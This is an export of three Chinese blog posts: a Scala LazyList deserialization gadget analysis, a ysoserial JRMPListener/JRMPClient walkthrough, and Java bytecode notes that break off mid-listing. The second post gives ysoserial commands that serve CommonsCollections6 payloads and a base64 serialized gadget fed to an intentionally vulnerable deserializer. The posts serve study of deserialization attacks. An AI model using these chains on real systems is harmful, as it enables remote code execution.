[{"id":"48e10c1cbdfed8072bf73a256dffc031","title":"Scala反序列化学习","content":"复现 CVE 的时候遇到了，趁此机会学一下原 CVE 的 issuehttps://github.com/scala/scala/pull/10118环境链接：https://github.com/yarocher/lazylist-cve-poc参考文章：https://www.freebuf.com/articles/network/375109.html\n前置知识scala 简介scala 本身就是一门语言，它运行在 JVM 中，并且能够兼容现有的 java 程序。scala 经过编译之后是生成的 java 字节码，这也是它能够运行在 JVM 上的理由，也可以调用 Java 现有的类库。但是 Scala 也有着自己的语法规则，并且有一些区别于 Java 的特性，对于这些新东西或者特性，接下来的基础笔记会一一写到。\nscala 新特性匹配器 match一个 scala2 中的例子，整体代码如下（怎么感觉写起来像 python）\nscalaobject Main &#123;\n  def show(result:String):Unit=&#123;\n    println(result)\n  &#125;\n  def main(args: Array[String]): Unit = &#123;\n    val x=11\n    val y=x match &#123;\n      case 1 =&gt; &quot;one&quot;\n      case 2 =&gt; &quot;two&quot;\n      case other =&gt; s&quot;other: $other&quot; // other是一个变量名，它会接收除了1和2以外的任何值\n      case _ =&gt; s&quot;other: _&quot;\n    &#125;\n    show(y)\n    //other: 11\n\n  &#125;\n&#125;这里我们可以看出 match 的主要使用是在某一个变量后，也就是判断该变量为什么情况时，将对应值返回给该变量。具体用法如下：\nscalax match &#123;\n  case 1=&gt;\n  case 2=&gt;\n  case other =&gt;//除了1 2情况，的其他情况\n  case _=&gt;\n&#125;\n\n这里other的优先级是要比默认情况的_要高的，我们看运行结果也能看出来总之 match 就是一个选择器，返回不同情况下的结果，当然 match 还有更多用法，这里我们只是粗略学习\n伴生对象具体定义：\n\n\n\n\n\n\n\n\n\n 伴生对象是Scala中一种特殊的单例对象，它与一个同名的类存在于同一个文件中，这个类被称为伴生类\n具体实例代码：\nscalaclass Person(val name: String, val age: Int) &#123;\n  private val secret = &quot;I love Scala&quot;\n\n\n  def sayHello(): Unit = &#123;\n    println(s&quot;Hello, I am $name, $age years old.&quot;)\n  &#125;\n&#125;\n\n// 定义一个Person对象，作为伴生对象\nobject Person &#123;\n\n  var count = 0\n\n  def increase(): Unit = &#123;\n    count += 1\n    println(s&quot;Person count: $count&quot;)\n  &#125;\n\n  def showSec():Unit=&#123;\n    println(apply(&quot;test&quot;,1).secret)\n  &#125;\n\n  // 定义一个apply方法，用于创建Person类的实例\n  def apply(name: String, age: Int): Person = &#123;\n    increase()\n    new Person(name, age) // 返回新的Person对象\n  &#125;\n\n  // 定义一个unapply方法，用于提取Person类的属性\n  def unapply(person: Person): Option[(String, Int)] = &#123;\n    if (person == null) None // 如果person为空，返回None\n    else Some(person.name, person.age) // 否则返回Some元组\n  &#125;\n&#125;\nobject Main &#123;\n\n  def main(args: Array[String]): Unit = &#123;\n    // 使用伴生对象的apply方法创建Person类的实例，省略了new关键字\n    val p1 = Person(&quot;Alice&quot;, 20)//Person count: 1\n    val p2 = Person(&quot;Bob&quot;, 25)//Person count: 2\n\n    // 使用伴生对象的字段和方法\n    println(Person.count) // 输出2\n    Person.increase() // Person count: 3\n    Person.showSec()//输出Person count: 4\n                    //I love Scala(伴生对象可以访问伴生类的私有成员)\n\n    // 使用伴生类的字段和方法\n    /*\n    println(p1.secret)// 无法访问私有成员\n     */\n    p1.sayHello() // 输出Hello, I am Alice, 20 years old.\n\n    // 使用模式匹配和提取器，利用伴生对象的unapply方法\n    val p3=null\n    p1 match &#123;\n      case Person(name, age) =&gt; println(s&quot;$name is $age years old.&quot;) // 输出Alice is 20 years old.\n      case _ =&gt; println(&quot;Unknown person.&quot;)\n    &#125;\n    p3 match &#123;\n      case Person(name, age) =&gt; println(s&quot;$name is $age years old.&quot;) // 输出Unknown person.\n      case _ =&gt; println(&quot;Unknown person.&quot;)\n    &#125;\n  &#125;\n&#125;示例代码就 3 个部分，具体类，伴生对象，main 运行逻辑。这里看到其实伴生对象就是和具体类同名的对象，然后里面有一个 apply 方法和 unapply 方法，我们等下讲，先看其他的具体方法\nscaladef increase(): Unit = &#123;\n    count += 1\n    println(s&quot;Person count: $count&quot;)\n  &#125;\n//count的初值是1，这里的逻辑就是让count+1,然后讲count输出出来\n\n\n  def showSec():Unit=&#123;\n    println(apply(&quot;test&quot;,1).secret)\n    //调用apply方法，并且将调用apply方法的secret值，并将其输出\n  &#125;apply 方法apply 方法为我们提供了一段快速创建实例化对象的手段，也就是我们不需要去写 new person，直接 person(&quot;hello&quot;),即可创建对象然后使用，然后将实例化方法的传参传给 apply，并且调用 apply 的逻辑，完成实例化。我们类比 __contruct 构造方法即可那我们这里的 apply 方法\nscaladef apply(name: String, age: Int): Person = &#123;\n    increase()\n    new Person(name, age) // 返回新的Person对象\n  &#125;它返回的就是一个 Person 类的实例然后记录一下伴生对象的特性：\n\n伴生对象和伴生类可以互相访问对方的私有成员，包括字段和方法。\n伴生对象的成员相当于Java中的静态成员，可以直接通过对象名调用，而不需要创建对象实例。\n伴生对象可以实现apply方法，用于创建伴生类的实例，这样就可以省略new关键字。\n伴生对象可以实现unapply方法，用于实现模式匹配和提取器的功能。\n伴生对象可以扩展一个或多个特质（trait），从而实现多重继承和混入（mixin）的效果。\n\n相当于给定义类的一段扩展功能\ntrait类似于 java 中的接口，它可以被类或者对象扩展，也可以 mix in混入（scala 中的新特性）trait 特质，能够被多层继承，也就是说我们一个类或者一个对象能够继承多个 trait，从而获得所有特质中的所有属性和方法具体定义代码示例：\nscalatrait PersonBody &#123;\n  val height: Int\n&#125;扩展单个属性以及扩展多个属性示例如下：\nscalatrait PersonBody &#123;\n  var height: Int\n&#125;\n\ntrait PersonHobby&#123;\n  var hobbyGame=&quot;Honor of King : World&quot;\n  def showHobby()\n&#125;\n\n//单个扩展继承\nclass Person3(name : String) extends PersonBody&#123;\n  override var height: Int = 170\n&#125;\n\n//多个扩展继承\nclass Person2(val name: String,val age: Int) extends PersonBody with PersonHobby&#123;\n  override var height: Int = 171\n  var Name: String =name\n  var Age: Int=age\n  override def showHobby(): Unit = &#123;\n    println(s&quot;no hobby,this is test&quot;)\n  &#125;\n\n&#125;\nobject Main &#123;\n\n  def main(args: Array[String]): Unit = &#123;\n    var person = new Person3(&quot;Cloud&quot;)\n    println(person.height)\n    //170\n    var person2=new Person2(&quot;stoocea&quot;,20)\n    person2.showHobby()\n  &#125;\n\n&#125;匿名函数匿名函数的官方定义：是作为参数传递给高阶函数的代码块。简要讲就是他是一个代码块，能够作为参数写传入函数。作为代码块就一定会执行逻辑，有如下例子：\nscalaval ints = List(1, 2, 3)\nval doubledInts = ints.map((i : Int)=&gt;i*2)我们定义了一段整数 List ints，然后我们还定义了一段 doubleInts，他是 ints 整数 List 经过 map 方法处理之后得到的。观察 map 方法的参数(i : Int)=&gt;i*2，初看有点看不懂，其实它就是匿名函数， =&gt;左边代表我们函数的参数定义，右边代表匿名函数的具体逻辑所以这里的效果就是将 Ints 整数 List 中的所有变量 i 都乘以 2，然后调用 map 方法创建一个新的列表。当然匿名函数还有许多的形式，这里只是最初始，且最好理解的形式 （我个人认为）\n惰性列表 LazyList*LazyList 是 scala2.13 版本之后引入的新的集合类型。惰性列表是为了惰性求值，而惰性求值的意思是：列表中的元素并不是一开始就会加载和计算好，而是只有在被需要的时候才会被计算。这句话其实包含了两层意思：1.有限元素下的节省内存和时间 2.无限元素下的节省内存和时间，只有用到了才会给你取，并且是无限取。\n一些惰性列表的成员：\n\n\n\nstate\n字段\n存储LazyList对象的状态，表示惰性序列的结构和计算状态，算是 LazyList 的具体值存储字段\n\n\n\nState\n特质，以及它的伴生对象\n定义LazyList对象的状态的特质，有两个子类：Cons和Empty\n\n\ntail\n方法\n返回一个新的LazyList对象，包含除了第一个元素之外的所有元素，惰性求值\n\n\nhead\n方法\n返回LazyList对象的第一个元素，严格求值\n\n\n示例代码\nscalaobject Main&#123;\n  val ones = LazyList.continually(1)\n  def main(args: Array[String]): Unit = &#123;\n    println(ones)\n  &#125;\n&#125;会发现 LazyList 里面的内容为空，这个时候我们象征性地将他里面的第一个元素取出来,用到一开始提到的 head 方法\nscalaobject Main&#123;\n  val ones = LazyList.continually(1)\n  def main(args: Array[String]): Unit = &#123;\n    println(ones.head)\n  &#125;\n&#125;从一开始的 LazyList 创建开始，由于我们并没有直接 new 出 LazyList，而是直接调用continually 方法，所以会来到它伴生对象的 continually 方法newLL 就是创建一个新的 LazyList，注意此时我们传入的参数 1 被作为参数 elem 传入，流入到 sCons 方法和下一轮的 continually 方法的循环。先看 sCons 方法的具体内容hd 是 1，tl 是通过 continually 创建好的新的一个 LazyList。具体的方法内容创建了一个新的 State trait实例。一开始我们提到 State 是一段特质，并且有它具体的伴生对象，里面共有两个方法，一个是 head 方法，一个是 tail 方法，对于 State 这个 trait 来说，它的 head 方法就是返回当前的元素，tail 方法方法就是返回存有无限个 1 的 LazyList再看 newLL 方法，具体内容就是将刚才创建好的 State 特质实例作为 new LazyList实例化构造的参数传入所以，整个 Continually 方法的返回值就是这一个装载了 State 实例对象的 LazyList，但是此时里面是空的，这也是为什么我们紧接着将其 println 的话，出来的结果就是LazyList(&lt;not computed&gt;)。因为我们并没有对 state 进行任何的调用或者赋值，那么就看下面的 head 方法的调用很简单的一段，直接去调用 state 的 head 参数，我们接着看 state 是怎么定义的具体的逻辑是通过调用 lazyState 方法获取到当前的 State，并且通过调用 State 的 head 和 tail 方法获取值。\nLazyList 的反序列化工作流程分析在研究 LazyList 的时候其实我们发现了它本身是继承 serializable 接口的，所以它能够反序列化，并且有个专门的类来处理反序列化和序列化writeObject 内容大致可以概括为：\n\n调用 javaio 原生的序列化流的defaultWriteObject()方法，开一段 Object 的序列化数据流，准备序列化\n然后一个 while 循环去遍历 LazyList 已经计算出来的元素，并且将其每一个都进行序列化操作，然后递归到后续的元素，继续重复操作\n序列化一个 SerializeEnd 标识符\n然后对该 LazyList 剩下的未计算的元素，也就是没有加载的元素也进行一次序列化操作\n\nreadObject 的内容大致可以概括为：\n\n调用 javaio 的原生反序列化流的defaultReadObject()，开一段反序列化的数据流，准备反序列化\n初始化一段字节数组 init  用来存储已经计算出来的元素  \nwhile 循环开始反序列化该序列化流种的元素，并且判定是否为特殊的**SerializeEnd **标识符，也就是判断有效计算的元素是否已经反序列化完毕。如果不是，将其存入 init 数组，如果是，说明有效元素已经反序列化完毕了，跳出该循环\n反序列化剩下没有计算的元素\n使用++方法链接 init 和 tail（噢那真的牛逼，还有这种方法）\n\n漏洞点分析乍一看好像 LazyList 的 readObject 没有可以利用的地方，我们跟进后续的链接操作，也就是 init 和 tail 链接的逻辑coll = init ++: tail我们跟进++:方法具体的内容是将 prefix，链接操作的后半段 B 作为参数，调用进 prependedAll 方法。而 prependedAll 方法在 LazyList 中是被重构了的，跟进具体定义这里首先是一段 if 判断，判断条件是调用 knownIsEmpty 的返回结果，这里接着跟进knownIsEmpty 方法具体方法内容是一段 合运算，当这里stateEvaluated为 true 时，后续才会调用 isEmpty 方法，这里继续跟进 isEmpty。方法具体逻辑为 state 字段和 State 的 Empty 实例进行比较，也就是判断 state 是否为空啦那么这里就跟我们之前提到过的 state 懒加载机制，当我们调用到 state 的时候会执行 state 的定义逻辑这里稳定执行一段 lazyState 方法，这个方法是 LazyList 构造器传入的匿名函数，当我们对其跟进的时候，会发现如下情况：他会生成一段伴生对象，并且带有 apply 方法。了解了这点，我们继续跟进，就会发现其本质是一段可控无参匿名函数所以我们可以提前将其设置为一段符合条件的匿名函数，就能够进一步利用了。\n可利用匿名函数寻找最终落到了寻找 scala 或者 java 中原生无参匿名函数，且可利用。单论这个条件是很难找到合适的方法的我们最后多提了一嘴：\n\n\n\n\n\n\n\n\n\n他会生成一段伴生对象，并且带有 apply 方法\n实际上不是的，在 scala 中，所有的无参匿名函数都会被编译为一段实现了 Function0 接口的实现对象，也就是一个针对于 Function0 的，带有 apply 方法的一个对象（具体这么做的原因我就不清楚了，翻了一下文档也没找到很好的解释）那么我们又多了一条寻找的线索：寻找实现了 Function0 的所有类或对象，也能够算是找到了一个对应的无参匿名函数。结合师傅已经在原文中提到关于匿名函数的另外的内容\n\n\n\n\n\n\n\n\n\n Scala编译器在编译Scala代码时，会将匿名函数转换成Java字节码，这样就可以在Java虚拟机上运行。为了与Java兼容，Scala编译器会为每个匿名函数生成一个类，并给这个类一个特殊的名字，通常是anonfun加上一些数字和符号。这个类名的作用是唯一地标识这个匿名函数，以便在运行时调用。\n所以在 JVM 内识别匿名函数的时候，实际上是在识别这些类，我们的目标也可以改为寻找这些类了\n\n\n\n\n\n\n\n\n\n 以 POC 中的 scala.sys.process.ProcessBuilderImpl$URLInput$$anonfun$$lessinit$greater$1为例$URLInput:表示ProcessBuilderImpl的内部类$$anonfun:表示匿名函数的前缀，表示这是一个自动生成的类。$$lessinit$greater:是的转义形式，表示这个匿名函数是在构造器中定义的。$1:是匿名函数的序号，表示这是第一个匿名函数。\n具体跟进一下 ProcessBuilderImpl如果我们接着跟进 URLInput 的下一个子类，发现找不到了，只有这么多内容那这个后续$$anonfun$$lessinit$greater$1是怎么生成的呢？我们一个一个来探究就比如$anonfun$$lessinit$greater这一段生成，结合ProcessBuilderImpl类中关于 URLInput 的定义部分，我们猜测当一个类继承了一个父类，并且这个被继承的父类的构造方法参数调用了子类的构造参数的方法时，scala 会生成一段$$anonfun$$lessinit$greater$类名的类来一段与之意思相近的示例代码\nscalaclass a()&#123;\n  def msg(): String = &#123;\n    return &quot;i am class a&quot;\n  &#125;\n&#125;\nclass b (name:String)\nclass c(url:a) extends b(url.msg())大致逻辑就是 c 继承自 b，并且 b 的构造方法中调用了 c 构造方法的参数 url看一下测试结果，好像并不是和我们猜测的那样，只是生成了 3 段 abc 字节码具体再到 URLInput 的目标继承类IStreamBuilder看一下，发现他第一个传参的形式其实不是单纯的参数传递，而是**传名参数**，具体也可以算是一种惰性机制，他不会在函数被调用时立即执行作为传参数传入，而是在该函数的代码块执行逻辑时调用到了它，才会进行它的逻辑那我们可以修改一下测试代码也给 b 里面设置一段传名参数\nscalaclass a()&#123;\n  def msg(): String = &#123;\n    return &quot;i am class a&quot;\n  &#125;\n&#125;\nclass b (name: =&gt;String)//这里注意冒号和等号之间的空格\nclass c(url:a) extends b(url.msg())这次验证了猜想看一下该字节码的具体内容javap -verbose -p 21.class这里我把它字节码文件名改成了 21.class，windowsshell 中的$有转义。不影响具体内容：发现它对 a 中定义的 msg 方法进行调用，结合传名参数的惰性机制，我们最开始并没有触发 b 中传名参数的逻辑执行，也并没有产生相应的$$anonfun$$lessinit$greater$类名的字节码文件。而当我们执行了传名参数的逻辑之后，才生成的$$anonfun$$lessinit$greater$类名的字节码文件。也就是说：scala.sys.process.ProcessBuilderImpl$URLInput$$anonfun$$lessinit$greater$1类的生成，是由url.openStream()的执行而触发的了解了这个部分，我们就能够知道为什么会找到scala.sys.process.ProcessBuilderImpl$URLInput$$anonfun$$lessinit$greater$1这个类了，接下来进行总结梳理\n利用总结首先，匿名函数本身在经过 scalac 编译器编译之后的字节码，其实是一段类的字节码，类似于$URLInput$$anonfun$$lessinit$greater$1这种，所以我们可以通过寻找这种类，并通过 LazyList 的构造器将其传入。那么当触发 readObject 方法，直到触发该匿名函数时，在 JVM 中实际上就是在调用该类，并且实例化。观察该类的字节码，在该类的 apply 方法中，会调用其子类构造方法中的参数的方法，到达利用的目的，比如 URLInput 链就会调用到 url.openStream()其他 scala 反序列化链也是如此\n","slug":"Scala反序列化","date":"2024-07-06T07:41:00.000Z","categories_index":"锻刀-Scala反序列化","tags_index":"锻刀","author_index":"stoocea"},{"id":"bca2d9535e8d62874b69184ae85883c1","title":"Ysoserial-JRMPListener/JRMPClient学习","content":"RMI 过程回顾回顾一下 RMI 的流程，算是复习。我们就拿一段示例代码来举例子\njavaimport java.rmi.Naming;\nimport java.rmi.registry.LocateRegistry;\n\npublic class RemoteServer &#123;\n    public static void main(String[] args) throws Exception &#123;\n        LocateRegistry.createRegistry(1099);\n        RemoteInterface remoteObject =new RemoteObject();\n        Naming.bind(&quot;rmi://127.0.0.1:1099/Hello&quot;,remoteObject);\n    &#125;\n\n&#125;\nJDK 版本稍微高一点之后，Registry 和 Server 端必须要在同一台机器上才能创建成功。总共分为 3 步走，\n\n创建注册中心\n创建远程对象\n绑定远程对象\n\n再看一段 Client 端对 Registry 端和 Server 端通信示例代码 \n\n通过 IP 端口获取到注册中心\n在通过调用注册中心的 lookup 方法，根据远程对象的 name 来获取到远程对象\n调用其方法\n\njavaimport java.rmi.NotBoundException;\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.registry.Registry;\nimport java.util.Arrays;\n\n\npublic class RMIClient &#123;\n    public static void main(String[] args) throws Exception &#123;\n        //通过getRegistry获取到注册中心\n        Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);\n        System.out.println(Arrays.toString(registry.list()));\n\n        //然后通过Client端的Stub代理类发送一个远程对象以及方法的请求调用\n        //这里我们通过注册中心拿到对应的远程对象，然后调用其方法\n        RemoteInterface stub=(RemoteInterface) registry.lookup(&quot;Hello&quot;);\n        System.out.println(stub.sayHello(new EvilClass().getEvil()));\n    &#125;\n\n&#125;客户端和服务端的概念其实不是固定的，只需要明确谁往目标发送请求获取数据，谁就是 Client 客户端，而提供这些数据的目标就是 Server 服务端。如果按照这么来看，那我们自己恶意服务器上开的 JRMPListener，其实就相当于服务端，目标向我们恶意服务器发送一个 JRMP 请求，比如调用 naming.lookup 这种方法，就会得到一串序列化结果，客户端会在本地将其反序列化。参考过程 7 或 9，都会在 Client 进行一段对请求到数据的反序列化操作\nJRMPListener 调试根据上图，我们其实可以将整个 JRMPListener 利用的过程看作 7 和 8 的过程，也就是客户端 lookup 触发服务查找，然后 JRMP 服务端接收到请求，并在\n初步攻击操作示例ysoserial 中提供了 JRMPListener 的 EXP，纯研究的话就是自己本地 idea 按照如下设置启动即可。如果是真实实战或者在 CTF 中，我们可以在自己 VPS 上编译一个 Ysoserial 的项目，然后运行如下命令启动：java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections6 &quot;touch /tmp/stoocea&quot;idea 设置如下：然后我们再写一个客户端\njavapackage JRMPTest;\n\nimport java.rmi.Naming;\n\npublic class Client &#123;\n    public static void main(String[] args) throws Exception&#123;\n        Naming.lookup(&quot;rmi://127.0.0.1:7777/whateverYouWant&quot;);\n    &#125;\n&#125;发现客户端对我们开启的 JRMP 监听端口发送请求后，会在本地进行反序列化操作，触发 CC6。而这个反序列化的过程其实是 触发了 RMI 中的 DGC 机制，而在客户端进行的反序列化这里我们可以两边都打断点进行调试，客户端触发的流程和 RMI 是一样的。\nJRMPListener 逻辑但是恶意服务端的逻辑就有所不同了，ysoserial 有自己的逻辑，这一段具体的代码位于 ysoserial.exploit.JRMPListener中，有一段特别熟悉，当前 Listener 进程开始之后调用 run 方法处理 socket 链接，然后初始化一些会用到的数据流，比如 bufferStream 和 outputStream然后根据当前接收到的客户端请求过来的数据流判断使用的协议类型，比如我们此时客户端是通过 naming.lookup 方法的执行发送过来的请求信息，所以这里 protocol 的值为 75，在 Java RMI 调用过程中代表 JRMP 协议，那么他会进入case TransportConstants.StreamProtocol的选项，并且执行完逻辑。然后由于此时该情况并没有加 break 语句，所以还是会执行case TransportConstants.SingleOpProtocol:所对应的逻辑：**doMessage(s, in, out, this.payloadObject);**domessage 里面的内容是根据 op 操作的值来进入 switch case 执行逻辑的，获取的 OP 来自于客户端的请求信息这里跟 Registry 端处理客户端请求的逻辑是很像的而在 docall 方法中就是将恶意对象序列化，并且将序列化数据写入通信流，等待客户端接收\n被攻击客户端逻辑先启动 JRMPListener，然后在naming.lookup处打个断点，然后跟进。（其实这里是可以双向打断点跟进的，只不过我觉得分开来比较清晰一点）跟进naming.lookup初步根据 Ip port 等信息创建 RegitryImpl_Stub，然后调用RegitryImpl_Stub 的 lookupStub 的 invoke，首先调用 newcall 建立与 JRMP 服务端的连接。也就是这一步走完服务端那边才接收到的 protocol 是 75，可以看作是 JRMP 协议握手的环节。然后将我们的请求信息，包括请求的远程对象的 name 等等信息都序列化写进当前请求流var3.writeObject(var1);然后调用 unicastRef 的 invoke 方法，这里的 Var1 是 StreamRemoteCall ，所以继续跟进StreamRemoteCall 的 executeCall 方法代码量较大，一部分一部分来首先获取当前通信流的 DGC 确认消息，看看当前请求到的这个远程对象是否需要被 DGC 掉，那很明显我们首次请求肯定不会，那么将该信息 releaseOutputStream 出去，告诉服务端。之后开始再向服务端那里获取到请求到的远程对象数据流（其实这里就是我们的恶意对象流了）readByte 获取序列化字节的具体消息，然后 readID 一下，这里的 ID 是判断我们是否正确的请求到了远程对象，过程是否有差错。之后就是一段 switch 来反序列化该恶意对象了，走过 readObject，即可完成攻击\n总结其实就服务端需要 yoserial 的伪造，所以代码跟进多一点，客户端被攻击的过程其实就是跟我们初次学习 RMI 中攻击客户端的逻辑是差不多的。只不过我们刚开学的那会，并没有具体说怎么打，只是把客户端被攻击的流程过了一遍，并不知道该如何去利用，那这次就是通过伪造 JRMP 恶意服务端，向客户端发送恶意对象的序列化数据完成的攻击。很有实战意义。\nJRMPClient 调试既然我们构造的是恶意 Client，并且具体的攻击点是 DGC 的话，那可以确定就是直接攻击 Server 端了，因为 DGC 的 Stub 和 Skel 本身都是存在于服务端的，作用是用来确定客户端还在不在使用当前这个远程对象，如果没有使用就把他垃圾回收并清除内存。\nDGC 创建过程所以，我觉得有必要回顾一下 DGC 的创建过程：在远程对象实例化的时候，我们一路走到 TCPTransport 的 exportObject 方法在调用完 listen 方法，创建一个 socket 等待注册中心（在本次攻击中也可以叫做客户端了）发送数据之后，会调用一次 Transport 的 exportObject 方法，我们跟进set 的方法就不看了，我们走进 putTarget 方法在 putTarget 方法中调用到了 DGCImpl 的静态变量，那么此时会完成 DGCImpl 类的初始化，那么就一定会执行到其静态代码块，跟进多开一条线程用来创建一条 DGCImpl_Skel，DGCImpl_Stub,相当于是创建了一个新的远程对象，并且将其 put 到了 ObjectTable 中\nDGC 处理服务逻辑其实也可以看做 DGC 是如何被攻击的逻辑。这里入口点是：服务端通过注册中心的 sun.rmi.transport.tcp.TCPTransport#handleMessages方法。紧接handleMessages方法中调用到 UnicastServerRef 的 dispatch 方法，而此时 dispatch 方法又会调用到 oldDispatch 方法，前面的具体内容就不跟进了，直接看 oldDispatch获取请求输入流中的数据，逐步获取到 readLong 的时候，这里 JRMPClient 端会提前设置好 Long 区为 objOut.writeLong(-669196253586618813L);也就是 DGC 操作的标识那么在调用this.skel.dispatch(var1, var2, var3, var4);的时候，跟进的就是 DGCImpl_Skel 的 dispatch 方法了这里会根据 var3 来选择到底是执行 dirty 操作还是 clean 操作，那么在 JRMPClient 中是设置的 1，也就是会进入 case1，clean 的逻辑经过 readObject，触发攻击链上面的流程简单的回顾了一下 DGC 的创建流程，以及服务端在接收到客户端的请求信息之后如何处理的逻辑，相当于是过了一遍 DGC 在服务端是如何被攻击的，接下里看 ysoserial 中的 JRMPClient 是如何构造恶意 Client 的\nJRMPClient 逻辑最重要的就是这段 makeDGCCall 方法了，将由它来发送 DGC 请求\n\n建立 socket 连接，保持通信状态，然后设置 TCP 协议连接\n然后设置 JRMP 连接的通信状态写入数据流\n设置 DGC 的 Long 数据区，以及一些其他无关但是不能为空的数据区\n最后写入恶意反序列化对象的序列化数据\n\n整体操作还是比较容易理解，到这肯定就想去试试是否能够打成功了，然后就遇到了一个问题：就是什么样的服务端才能被攻击呢？\nJRMPListener&#x2F;Client Gadget这两段 GadGets 存在的意义就在于当我们能够执行反序列化操作的时候，能够利用这两个 GagGets 达到建立被害服务端和被害客户端的操作，具体流程我就不跟了，直接利用：\nJRMPListenerjavajava -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPListener 7777|base64 &gt;1.txt来一个无限循环的 Server 端，来反序列化操作,不然执行完一遍之后其端口开启的状态就没了，具体代码如下\njavapackage JRMPTest;\nimport java.io.ByteArrayInputStream;\nimport java.io.IOException;\nimport java.io.ObjectInputStream;\nimport java.util.Base64;\nimport java.util.Scanner;\npublic class Server &#123;\n    public static void main(String[] args) throws Exception&#123;\n        String base64String = &quot;rO0ABXNyACJzdW4ucm1pLnNlcnZlci5BY3RpdmF0aW9uR3JvdXBJbXBsT+r9SAwuMqcCAARaAA1n&quot; +\n                &quot;cm91cEluYWN0aXZlTAAGYWN0aXZldAAVTGphdmEvdXRpbC9IYXNodGFibGU7TAAHZ3JvdXBJRHQA&quot; +\n                &quot;J0xqYXZhL3JtaS9hY3RpdmF0aW9uL0FjdGl2YXRpb25Hcm91cElEO0wACWxvY2tlZElEc3QAEExq&quot; +\n                &quot;YXZhL3V0aWwvTGlzdDt4cgAjamF2YS5ybWkuYWN0aXZhdGlvbi5BY3RpdmF0aW9uR3JvdXCVLvKw&quot; +\n                &quot;BSnVVAIAA0oAC2luY2FybmF0aW9uTAAHZ3JvdXBJRHEAfgACTAAHbW9uaXRvcnQAJ0xqYXZhL3Jt&quot; +\n                &quot;aS9hY3RpdmF0aW9uL0FjdGl2YXRpb25Nb25pdG9yO3hyACNqYXZhLnJtaS5zZXJ2ZXIuVW5pY2Fz&quot; +\n                &quot;dFJlbW90ZU9iamVjdEUJEhX14n4xAgADSQAEcG9ydEwAA2NzZnQAKExqYXZhL3JtaS9zZXJ2ZXIv&quot; +\n                &quot;Uk1JQ2xpZW50U29ja2V0RmFjdG9yeTtMAANzc2Z0AChMamF2YS9ybWkvc2VydmVyL1JNSVNlcnZl&quot; +\n                &quot;clNvY2tldEZhY3Rvcnk7eHIAHGphdmEucm1pLnNlcnZlci5SZW1vdGVTZXJ2ZXLHGQcSaPM5+wIA&quot; +\n                &quot;AHhyABxqYXZhLnJtaS5zZXJ2ZXIuUmVtb3RlT2JqZWN002G0kQxhMx4DAAB4cHcSABBVbmljYXN0&quot; +\n                &quot;U2VydmVyUmVmeAAAHmFwcAAAAAAAAAAAcHAAcHBw&quot;;\n\n\n            // 解码Base64字符串\n            byte[] decodedBytes = Base64.getDecoder().decode(base64String);\n            // 反序列化\n            Object deserializedObject = deserialize(decodedBytes);\n        while (true) &#123;\n            System.out.println(System.currentTimeMillis());\n            Thread.sleep(3000);\n        &#125;\n&#125;\n    public static Object deserialize(byte[] bytes) throws IOException, ClassNotFoundException &#123;\n        try (ByteArrayInputStream bais = new ByteArrayInputStream(bytes);\n             ObjectInputStream ois = new ObjectInputStream(bais)) &#123;\n            return ois.readObject();\n        &#125;\n    &#125;\n\n&#125;\n调用栈如下然后再去试着用 yso 中的 JRMPClient 打一下攻击效果如下\nJRMPClient那 JRMPClient 的 Gadgets 也是如此使用\njavajava -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient 127.0.0.1:7777|base64然后开启 JRMPListenerjava -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPListener 7777 CommonsCollections6 calc再模拟一次反序列化触发该 Gadgets攻击效果如下\n总结关于 RMI 中两端（客户端 服务端）互打的具体实现，以及在实战时的攻击操作学习。重新过了一遍 RMI 的流程，更加清晰了，suki~\n","slug":"JRMPListener Client学习","date":"2024-07-06T07:41:00.000Z","categories_index":"锻刀理论包括一点挥刀练习java-JRMPListener/Client","tags_index":"锻刀","author_index":"stoocea"},{"id":"d401c16d5adfa98368631db68a02ca33","title":"Java字节码初步学习","content":"背景引入我们平常所写的 Java 是不能被 JVM 识别所运行的，必须将其编译成 class 文件，JVM 才能够识别代码，进行对应的程序操作。Java 有着”一次编译，到处运行”的特点，也就是说当我们对一份 java 代码进行编译之后，得到的 class 文件能够放在任意机器或者任意 OS 系统中的 JVM 中识别并运行。当然 JVM 并不止单单支持 Java。\nJava 字节码文件class 文件本质是一个以 8 位字节为基础的二进制流。所有的 class 文件开头的前四个字节都是固定的魔数– 0xCAFEBABE  （咖啡宝贝）。当然这个主要是用来让 JVM 识别该文件是否为 class 文件该 class 文件编译之前采用的 Java 版本在魔数之后的 4 个字节给出，前两个字节表示次版本号，后两个字节表示主版本号。class 文件的 10 进制形式能够在 oracle 官网进行版本查询，得知更加具体的版本号比如我此时编译一份 java 文件\njavapackage org.example;\n\npublic class person &#123;\n    private int num = 1;\n    public static int NUM = 100;\n\n    public int func(int a, int b) &#123;\n        return add(a, b);\n    &#125;\n\n    public int add(int a, int b) &#123;\n        return a + b + num;\n    &#125;\n\n    public int sub(int a, int b) &#123;\n        return a - b - NUM;\n    &#125;\n&#125;这还只是 class 文件的二进制形式，我们能够通过其他工具查看到更加具体的 class 字节码内容。比如 idea 的自带的 view 功能。这里我们依然选择 person 类编译之后的 class 文件进行查看选定 person.class 文件之后点击上方的 view，然后选择 Show ByteCode就可以得到这么一份还算比较好看的 Bytecode或者我们采用javapjava 原生的字节码工具也能够查看。来一份 javap 的参数表\njava -help  --help  -?        输出此用法消息\n  -version                 版本信息\n  -v  -verbose             输出附加信息\n  -l                       输出行号和本地变量表\n  -public                  仅显示公共类和成员\n  -protected               显示受保护的/公共类和成员\n  -package                 显示程序包/受保护的/公共类\n                           和成员 (默认)\n  -p  -private             显示所有类和成员\n  -c                       对代码进行反汇编\n  -s                       输出内部类型签名\n  -sysinfo                 显示正在处理的类的\n                           系统信息 (路径, 大小, 日期, MD5 散列)\n  -constants               显示最终常量\n  -classpath &lt;path&gt;        指定查找用户类文件的位置\n  -cp &lt;path&gt;               指定查找用户类文件的位置\n  -bootclasspath &lt;path&gt;    覆盖引导类文件的位置这里用 javap -verbose -p person.class 生成的字节码查看如下\njavapublic class org.example.person\n  minor version: 0\n  major version: 52\n  flags: ACC_PUBLIC, ACC_SUPER\nConstant pool:\n   #1 = Methodref          #6.#26         // java/lang/Object.&quot;&lt;init&gt;&quot;:()V\n   #2 = Fieldref           #5.#27         // 